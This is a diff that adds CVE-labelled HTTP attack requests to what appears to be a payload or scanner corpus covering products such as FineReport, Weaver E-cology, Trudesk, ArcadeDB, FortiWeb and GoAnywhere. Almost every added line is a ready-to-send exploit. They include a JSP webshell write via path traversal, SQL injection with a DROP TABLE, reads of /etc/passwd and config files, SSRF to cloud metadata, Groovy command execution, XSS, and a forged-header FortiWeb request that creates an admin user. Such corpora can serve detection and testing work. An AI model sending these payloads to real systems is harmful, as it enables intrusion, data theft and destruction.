@@ -4457,3 +4457,97 @@ POST /submit header="Content-Type: application/x-www-form-urlencoded" body="root
 POST /submit header="Content-Type: application/x-www-form-urlencoded" body_file=payloads/php2shell-form-field-count.txt
 POST /upload proto=h2c header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-unquoted-name.txt
 POST /upload header="Content-Encoding: gzip" header="Content-Type: multipart/form-data; boundary=X" bodyhex=1f8b0800000000000203edcd310ac3300c05d0dde03b18efa27b42a7f6081d0ac683ea2820882d136be9ed8be9d0b117107ffb1ffe03787a7793a6d414ee3cba0c5696b6845dce0a1b2aaea161a56bdcf9a09130a7574e25a72dc735cceebbc6dfcde3dd6909d8fbc105e7d9458a92c2d093b07a3703e69a6baeb9e6fe7301bcfb009d6917d1a7050000
+
+# --- CVE-2021-48014 (FineReport): unauthenticated path traversal in the
+#     design_save_svg operation writes a JSP webshell through filePath. ---
+POST /WebReport/ReportServer?op=design_save_svg&filePath=../../../../webapps/ROOT/shell.jsp header="Content-Type: application/x-www-form-urlencoded" body="__CONTENT__=<%25%20out.print(%22pwned%22)%3B%20%25>"
+
+# --- CVE-2019-25778 (SeaCMS): unauthenticated SQL injection in the rlist[]
+#     array parameter of the comment API. ---
+GET /comment/api/index.php?rlist%5B%5D=1%27%20and%20extractvalue(1,concat(0x7e,version()))--%20-
+GET /comment/api/index.php?rlist%5B0%5D=1%20union%20select%201,2,3--%20-
+
+# --- CVE-2022-51022 (YiShaAdmin): unauthenticated path traversal in the
+#     DownloadFile endpoint reads and deletes arbitrary files through filePath. ---
+GET /admin/File/DownloadFile?filePath=..%2f..%2f..%2f..%2fetc%2fpasswd&delete=1
+
+# --- CVE-2022-51023 (PHPOK): unauthenticated ORDER BY SQL injection through
+#     the sort parameter. ---
+GET /api.php?c=project&f=index&sort=1%20and%20extractvalue(1,concat(0x7e,database()))--%20-
+
+# --- CVE-2024-58393 (i-Netsolution Readymade Unilevel Ecommerce MLM):
+#     unauthenticated SQL injection through the id parameter. ---
+GET /product-details.php?id=1%20and%20sleep(5)
+
+# --- CVE-2025-71434 (Weaver E-cology): unauthenticated SQL injection in the
+#     document list endpoint, and file disclosure through ln.FileDownload. ---
+POST /api/doc/out/more/list?srcType=2 header="Content-Type: application/x-www-form-urlencoded" body="elementmore=1&doc_datefrom=1%27%20AND%20sleep(5)--&doc_dateto=2026-01-01"
+GET /weaver/ln.FileDownload?fpath=../../../../WEB-INF/web.xml
+
+# --- CVE-2018-25438 (Intermesh Group-Office): unauthenticated path traversal
+#     in compress.php through the file parameter. ---
+GET /compress.php?file=../../../../etc/passwd
+
+# --- CVE-2018-25439 (MetInfo CMS): unauthenticated path traversal in
+#     thumb.php through the dir parameter, using backslash sequences. ---
+GET /include/thumb.php?dir=..%5c..%5c..%5cconfig_db.php
+
+# --- CVE-2021-48015 (JeeWMS): unauthenticated path traversal in
+#     showOrDownByurl.do through dbPath. ---
+GET /systemController/showOrDownByurl.do?dbPath=../../../../windows/win.ini
+
+# --- CVE-2021-48017 (OrbiTeam BSCW): unauthenticated path traversal in the
+#     theme operation through style_name. ---
+GET /pub/bscw.cgi/1?op=theme&style_name=../../../../etc/passwd
+
+# --- CVE-2022-51024 (Kavita): unauthenticated path traversal in the
+#     cover-upload filename parameter. ---
+GET /api/image/cover-upload?filename=../../appsettings.json
+
+# --- CVE-2024-58396 (YouDataSum CPAS): unauthenticated path traversal in
+#     downPlugs through the fileId parameter. ---
+GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd
+
+# --- CVE-2026-114493 (LocalAI): SSRF in the gallery apply handler; the
+#     config URL redirects to a cloud metadata endpoint. ---
+POST /models/apply header="Content-Type: application/json" body="{\"config_url\":\"http://169.254.169.254/latest/meta-data/\"}"
+
+# --- CVE-2026-115330 (Lotus): stacked SQL statements in custom metric
+#     queries reach the metrics API. ---
+POST /app/metrics/ header="Content-Type: application/x-www-form-urlencoded" body="metric=1%3B%20DROP%20TABLE%20users%3B--"
+
+# --- CVE-2026-114081 (Trigger.dev): SQL injection in the query compiler
+#     through backtick-quoted window-function names. ---
+POST /api/v1/query header="Content-Type: application/json" body="{\"query\":\"SELECT 1 FROM runs WHERE 1=1 UNION SELECT 1--\"}"
+
+# --- CVE-2026-114399 (Trudesk): path traversal in the backup delete and
+#     restore endpoints. ---
+DELETE /api/v1/backup/..%2f..%2f..%2fetc%2fpasswd
+
+# --- CVE-2026-114396 (Trudesk): server-side JavaScript injection through a
+#     MongoDB $where clause in the ticket search. ---
+GET /api/v1/tickets/search?search%5B%24where%5D=this.password.match(%2F.*%2F)
+
+# --- CVE-2026-114059 (ArcadeDB): Gremlin/Groovy command execution through the
+#     command API when the Groovy engine is enabled. ---
+POST /api/v1/command/prod header="Content-Type: application/json" body="{\"command\":\"g.V().map{'$(id)'.execute().text}\"}"
+
+# --- CVE-2026-112904 (Vvveb): path traversal in the backup/restore file
+#     parameter. ---
+GET /admin/backup?file=../../../../etc/passwd
+
+# --- CVE-2026-10632 (Zimbra): reflected XSS through the packages parameter of
+#     the /h/rest document editor. ---
+GET /h/rest?packages=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+# --- CVE-2026-55486 (Goobi viewer): reflected XSS through the unvalidated
+#     origin parameter of the IIIF Auth endpoints. ---
+GET /viewer/iiif/auth/login?origin=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+# --- CVE-2025-64446 (Fortinet FortiWeb, KEV): relative path traversal in the
+#     admin API reaches cgi-bin/fwbcgi with a forged CGIINFO header. ---
+POST /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi header="CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==" header="Content-Type: application/x-www-form-urlencoded" body="{\"data\":{\"q_type\":1,\"name\":\"pwned\",\"access-profile\":\"prof_admin\",\"trusthostv4\":\"0.0.0.0/0\",\"type\":\"local-user\",\"password\":\"pwned\"}}"
+
+# --- CVE-2025-10035 (Fortra GoAnywhere MFT, KEV): pre-auth deserialization in
+#     the License Servlet; the encrypted license bundle carries the gadget. ---
+POST /goanywhere/lic/accept header="Content-Type: application/x-www-form-urlencoded" body="bundle=AAEAAAD%2F%2F%2F%2F%2F%2F%2F%2F"
